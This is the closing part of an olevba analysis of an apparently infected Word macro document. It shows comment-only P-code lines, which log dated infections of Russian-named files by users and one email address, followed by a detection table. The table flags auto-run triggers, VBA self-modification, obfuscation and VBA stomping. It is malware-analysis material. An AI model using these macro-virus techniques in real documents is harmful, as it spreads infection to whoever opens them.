' Line #163:
' 	QuoteRem 0x0000 0x0000 ""
' Line #164:
' 	QuoteRem 0x0000 0x001F " 16:53:21 - ïÿòíèöà, 2 èþí 2000"
' Line #165:
' 	QuoteRem 0x0000 0x0006 " Vadim"
' Line #166:
' 	QuoteRem 0x0000 0x000C " Êí-äèïë.doc"
' Line #167:
' 	QuoteRem 0x0000 0x0000 ""
' Line #168:
' 	QuoteRem 0x0000 0x0000 ""
' Line #169:
' 	QuoteRem 0x0000 0x001F " 17:15:28 - ïÿòíèöà, 2 èþí 2000"
' Line #170:
' 	QuoteRem 0x0000 0x0006 " Vadim"
' Line #171:
' 	QuoteRem 0x0000 0x0015 " Çàêëþ÷åíèå (äèï).doc"
' Line #172:
' 	QuoteRem 0x0000 0x0000 ""
' Line #173:
' 	QuoteRem 0x0000 0x0000 ""
' Line #174:
' 	QuoteRem 0x0000 0x001F " 18:47:42 - ïÿòíèöà, 2 èþí 2000"
' Line #175:
' 	QuoteRem 0x0000 0x0006 " Vadim"
' Line #176:
' 	QuoteRem 0x0000 0x001D " report_Ðàñ÷åò ôèí. ïëàíà.doc"
' Line #177:
' 	QuoteRem 0x0000 0x0000 ""
' Line #178:
' 	QuoteRem 0x0000 0x0000 ""
' Line #179:
' 	QuoteRem 0x0000 0x0022 " 8:38:25 - ïîíåäåëüíèê, 5 èþí 2000"
' Line #180:
' 	QuoteRem 0x0000 0x0006 " Vadim"
' Line #181:
' 	QuoteRem 0x0000 0x000A " Äîêóìåíò1"
' Line #182:
' 	QuoteRem 0x0000 0x0000 ""
' Line #183:
' 	QuoteRem 0x0000 0x0000 ""
' Line #184:
' 	QuoteRem 0x0000 0x0022 " 8:42:42 - ïîíåäåëüíèê, 5 èþí 2000"
' Line #185:
' 	QuoteRem 0x0000 0x0006 " Vadim"
' Line #186:
' 	QuoteRem 0x0000 0x0016 " ïèñ îòãðÑÒÄ 23 05.doc"
' Line #187:
' 	QuoteRem 0x0000 0x0000 ""
' Line #188:
' 	QuoteRem 0x0000 0x0000 ""
' Line #189:
' 	QuoteRem 0x0000 0x0023 " 14:05:42 - ïîíåäåëüíèê, 5 èþí 2000"
' Line #190:
' 	QuoteRem 0x0000 0x0006 " Vadim"
' Line #191:
' 	QuoteRem 0x0000 0x000F " ÐÅ×Ü (äèï).doc"
' Line #192:
' 	QuoteRem 0x0000 0x0000 ""
' Line #193:
' 	QuoteRem 0x0000 0x0000 ""
' Line #194:
' 	QuoteRem 0x0000 0x0023 " 14:32:24 - ïîíåäåëüíèê, 5 èþí 2000"
' Line #195:
' 	QuoteRem 0x0000 0x0006 " Vadim"
' Line #196:
' 	QuoteRem 0x0000 0x001F " Ãëàâ.áóõ.ÒÄ ÂÇ Ëûñüâ 11.04.doc"
' Line #197:
' 	QuoteRem 0x0000 0x0000 ""
' Line #198:
' 	QuoteRem 0x0000 0x0000 ""
' Line #199:
' 	QuoteRem 0x0000 0x0023 " 15:07:54 - ïîíåäåëüíèê, 5 èþí 2000"
' Line #200:
' 	QuoteRem 0x0000 0x0006 " Vadim"
' Line #201:
' 	QuoteRem 0x0000 0x0017 " Êîð÷àãàíîâó 17.01..doc"
' Line #202:
' 	QuoteRem 0x0000 0x0000 ""
' Line #203:
' 	QuoteRem 0x0000 0x0000 ""
' Line #204:
' 	QuoteRem 0x0000 0x0023 " 15:13:36 - ïîíåäåëüíèê, 5 èþí 2000"
' Line #205:
' 	QuoteRem 0x0000 0x0006 " Vadim"
' Line #206:
' 	QuoteRem 0x0000 0x0020 " Ãëàâ.áóõ.ÒÄ ÂÇ Êîíñòð 19.04.doc"
' Line #207:
' 	QuoteRem 0x0000 0x0000 ""
' Line #208:
' 	QuoteRem 0x0000 0x0000 ""
' Line #209:
' 	QuoteRem 0x0000 0x0023 " 15:30:58 - ïîíåäåëüíèê, 5 èþí 2000"
' Line #210:
' 	QuoteRem 0x0000 0x0006 " Vadim"
' Line #211:
' 	QuoteRem 0x0000 0x000B " ÄÈÏËÎÌ.doc"
' Line #212:
' 	QuoteRem 0x0000 0x0000 ""
' Line #213:
' 	QuoteRem 0x0000 0x0000 ""
' Line #214:
' 	QuoteRem 0x0000 0x001D " 18:54:44 - ñðåäà, 7 èþí 2000"
' Line #215:
' 	QuoteRem 0x0000 0x0007 " Sergey"
' Line #216:
' 	QuoteRem 0x0000 0x001A " Ïðèáûëè -óáûòêè (äèï).doc"
' Line #217:
' 	QuoteRem 0x0000 0x0000 ""
' Line #218:
' 	QuoteRem 0x0000 0x0000 ""
' Line #219:
' 	QuoteRem 0x0000 0x001D " 18:54:58 - ñðåäà, 7 èþí 2000"
' Line #220:
' 	QuoteRem 0x0000 0x0007 " Sergey"
' Line #221:
' 	QuoteRem 0x0000 0x0012 " Êýø-ôëî (äèï).doc"
' Line #222:
' 	QuoteRem 0x0000 0x0000 ""
' Line #223:
' 	QuoteRem 0x0000 0x0000 ""
' Line #224:
' 	QuoteRem 0x0000 0x001D " 18:55:08 - ñðåäà, 7 èþí 2000"
' Line #225:
' 	QuoteRem 0x0000 0x0007 " Sergey"
' Line #226:
' 	QuoteRem 0x0000 0x0020 " Ôèíàíñîâûå ïîêàçàòåëè (äèï).doc"
' Line #227:
' 	QuoteRem 0x0000 0x0000 ""
' Line #228:
' 	QuoteRem 0x0000 0x0000 ""
' Line #229:
' 	QuoteRem 0x0000 0x001D " 18:55:25 - ñðåäà, 7 èþí 2000"
' Line #230:
' 	QuoteRem 0x0000 0x0007 " Sergey"
' Line #231:
' 	QuoteRem 0x0000 0x0011 " Áàëàíñ (äèï).doc"
' Line #232:
' 	QuoteRem 0x0000 0x0000 ""
' Line #233:
' 	QuoteRem 0x0000 0x0000 ""
' Line #234:
' 	QuoteRem 0x0000 0x001D " 18:55:46 - ñðåäà, 7 èþí 2000"
' Line #235:
' 	QuoteRem 0x0000 0x0007 " Sergey"
' Line #236:
' 	QuoteRem 0x0000 0x0027 " ÏËÀÍÎÂÀß ÊÀËÜÊÓËßÖÈß ÑÅÁÅÑÒÎÈÌÎÑÒÈ.doc"
' Line #237:
' 	QuoteRem 0x0000 0x0000 ""
' Line #238:
' 	QuoteRem 0x0000 0x0000 ""
' Line #239:
' 	QuoteRem 0x0000 0x001F " 11:51:49 - ÷åòâåðã, 8 èþí 2000"
' Line #240:
' 	QuoteRem 0x0000 0x0007 " Sergey"
' Line #241:
' 	QuoteRem 0x0000 0x0020 " Ôèíàíñîâûå ïîêàçàòåëè (äèï).doc"
' Line #242:
' 	QuoteRem 0x0000 0x0000 ""
' Line #243:
' 	QuoteRem 0x0000 0x0000 ""
' Line #244:
' 	QuoteRem 0x0000 0x001F " 11:51:58 - ÷åòâåðã, 8 èþí 2000"
' Line #245:
' 	QuoteRem 0x0000 0x0007 " Sergey"
' Line #246:
' 	QuoteRem 0x0000 0x0011 " Áàëàíñ (äèï).doc"
' Line #247:
' 	QuoteRem 0x0000 0x0000 ""
' Line #248:
' 	QuoteRem 0x0000 0x0000 ""
' Line #249:
' 	QuoteRem 0x0000 0x001F " 11:52:09 - ÷åòâåðã, 8 èþí 2000"
' Line #250:
' 	QuoteRem 0x0000 0x0007 " Sergey"
' Line #251:
' 	QuoteRem 0x0000 0x0027 " ÏËÀÍÎÂÀß ÊÀËÜÊÓËßÖÈß ÑÅÁÅÑÒÎÈÌÎÑÒÈ.doc"
' Line #252:
' 	QuoteRem 0x0000 0x0000 ""
' Line #253:
' 	QuoteRem 0x0000 0x0000 ""
' Line #254:
' 	QuoteRem 0x0000 0x001F " 10:46:12 - ïÿòíèöà, 9 èþí 2000"
' Line #255:
' 	QuoteRem 0x0000 0x0007 " Sergey"
' Line #256:
' 	QuoteRem 0x0000 0x000D " MH000024.doc"
' Line #257:
' 	QuoteRem 0x0000 0x0000 ""
' Line #258:
' 	QuoteRem 0x0000 0x0000 ""
' Line #259:
' 	QuoteRem 0x0000 0x001F " 10:58:49 - ïÿòíèöà, 9 èþí 2000"
' Line #260:
' 	QuoteRem 0x0000 0x0007 " Sergey"
' Line #261:
' 	QuoteRem 0x0000 0x000D " MH000026.doc"
' Line #262:
' 	QuoteRem 0x0000 0x0000 ""
' Line #263:
' 	QuoteRem 0x0000 0x0000 ""
' Line #264:
' 	QuoteRem 0x0000 0x001F " 9:46:43 - âòîðíèê, 13 èþí 2000"
' Line #265:
' 	QuoteRem 0x0000 0x0007 " Sergey"
' Line #266:
' 	QuoteRem 0x0000 0x000E " Äîêóìåíò1.doc"
' Line #267:
' 	QuoteRem 0x0000 0x0000 ""
' Line #268:
' 	QuoteRem 0x0000 0x0000 ""
' Line #269:
' 	QuoteRem 0x0000 0x001F " 9:47:47 - âòîðíèê, 13 èþí 2000"
' Line #270:
' 	QuoteRem 0x0000 0x0007 " Sergey"
' Line #271:
' 	QuoteRem 0x0000 0x0011 " Îðõèäåêòîìèÿ.doc"
' Line #272:
' 	QuoteRem 0x0000 0x0000 ""
' Line #273:
' 	QuoteRem 0x0000 0x0000 ""
' Line #274:
' 	QuoteRem 0x0000 0x0020 " 10:23:03 - âòîðíèê, 13 èþí 2000"
' Line #275:
' 	QuoteRem 0x0000 0x0007 " Sergey"
' Line #276:
' 	QuoteRem 0x0000 0x0036 " Ìèíèñòåðñòâî ñåëüñêîãî õîçÿéñòâà è ïðîäîâîëüñòâèÿ.doc"
' Line #277:
' 	QuoteRem 0x0000 0x0000 ""
' Line #278:
' 	QuoteRem 0x0000 0x0000 ""
' Line #279:
' 	QuoteRem 0x0000 0x001F " 18:15:04 - Tuesday, 1 Aug 2000"
' Line #280:
' 	QuoteRem 0x0000 0x0013 " Replication System"
' Line #281:
' 	QuoteRem 0x0000 0x000A " DOC10.DOC"
' Line #282:
' 	QuoteRem 0x0000 0x0000 ""
' Line #283:
' 	QuoteRem 0x0000 0x0000 ""
' Line #284:
' 	QuoteRem 0x0000 0x001F " 18:15:15 - Tuesday, 1 Aug 2000"
' Line #285:
' 	QuoteRem 0x0000 0x0013 " Replication System"
' Line #286:
' 	QuoteRem 0x0000 0x000A " DOC11.DOC"
' Line #287:
' 	QuoteRem 0x0000 0x0000 ""
' Line #288:
' 	QuoteRem 0x0000 0x0000 ""
' Line #289:
' 	QuoteRem 0x0000 0x001F " 18:15:25 - Tuesday, 1 Aug 2000"
' Line #290:
' 	QuoteRem 0x0000 0x0013 " Replication System"
' Line #291:
' 	QuoteRem 0x0000 0x000A " DOC12.DOC"
' Line #292:
' 	QuoteRem 0x0000 0x0000 ""
' Line #293:
' 	QuoteRem 0x0000 0x0000 ""
' Line #294:
' 	QuoteRem 0x0000 0x001F " 18:15:33 - Tuesday, 1 Aug 2000"
' Line #295:
' 	QuoteRem 0x0000 0x0013 " Replication System"
' Line #296:
' 	QuoteRem 0x0000 0x000A " DOC13.DOC"
' Line #297:
' 	QuoteRem 0x0000 0x0000 ""
' Line #298:
' 	QuoteRem 0x0000 0x0000 ""
' Line #299:
' 	QuoteRem 0x0000 0x001F " 18:15:42 - Tuesday, 1 Aug 2000"
' Line #300:
' 	QuoteRem 0x0000 0x0013 " Replication System"
' Line #301:
' 	QuoteRem 0x0000 0x000A " DOC14.DOC"
' Line #302:
' 	QuoteRem 0x0000 0x0000 ""
' Line #303:
' 	QuoteRem 0x0000 0x0000 ""
' Line #304:
' 	QuoteRem 0x0000 0x001F " 18:15:51 - Tuesday, 1 Aug 2000"
' Line #305:
' 	QuoteRem 0x0000 0x0013 " Replication System"
' Line #306:
' 	QuoteRem 0x0000 0x0009 " DOC7.DOC"
' Line #307:
' 	QuoteRem 0x0000 0x0000 ""
' Line #308:
' 	QuoteRem 0x0000 0x0000 ""
' Line #309:
' 	QuoteRem 0x0000 0x0022 " 11:03:25 AM - Monday, 11 Sep 2000"
' Line #310:
' 	QuoteRem 0x0000 0x0009 " Ditry PC"
' Line #311:
' 	QuoteRem 0x0000 0x000C " sample1.doc"
' Line #312:
' 	QuoteRem 0x0000 0x0000 ""
' Line #313:
' 	QuoteRem 0x0000 0x0000 ""
' Line #314:
' 	QuoteRem 0x0000 0x0025 " 11:23:01 PM - Wednesday, 29 Jan 1997"
' Line #315:
' 	QuoteRem 0x0000 0x001D " ¡Jack! & ¡Rose! - T9999T :-("
' Line #316:
' 	QuoteRem 0x0000 0x000A " Document3"
' Line #317:
' 	QuoteRem 0x0000 0x0012 " ncaotri@yahoo.com"
' Line #318:
' 	Reparse 0x0025 "I love you. I miss you so much....!!!"
' Line #319:
' 	QuoteRem 0x0000 0x0000 ""
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

